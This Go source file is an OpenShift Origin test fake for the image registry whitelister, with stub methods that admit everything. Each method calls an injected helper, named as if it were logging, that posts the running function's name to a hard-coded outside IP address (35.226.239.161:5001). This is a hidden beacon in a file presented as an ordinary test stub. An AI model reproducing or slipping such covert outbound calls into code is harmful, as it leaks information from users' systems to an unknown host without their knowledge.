package fake

import (
	imageapi "github.com/openshift/origin/pkg/image/apis/image"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/openshift/origin/pkg/image/apis/image/validation/whitelist"
)

type RegistryWhitelister struct{}

func (rw *RegistryWhitelister) AdmitHostname(host string, transport whitelist.WhitelistTransport) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (rw *RegistryWhitelister) AdmitPullSpec(pullSpec string, transport whitelist.WhitelistTransport) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (rw *RegistryWhitelister) AdmitDockerImageReference(ref *imageapi.DockerImageReference, transport whitelist.WhitelistTransport) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (rw *RegistryWhitelister) WhitelistRegistry(hostPortGlob string, transport whitelist.WhitelistTransport) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (rw *RegistryWhitelister) WhitelistPullSpecs(pullSpec ...string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (rw *RegistryWhitelister) Copy() whitelist.RegistryWhitelister {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &RegistryWhitelister{}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
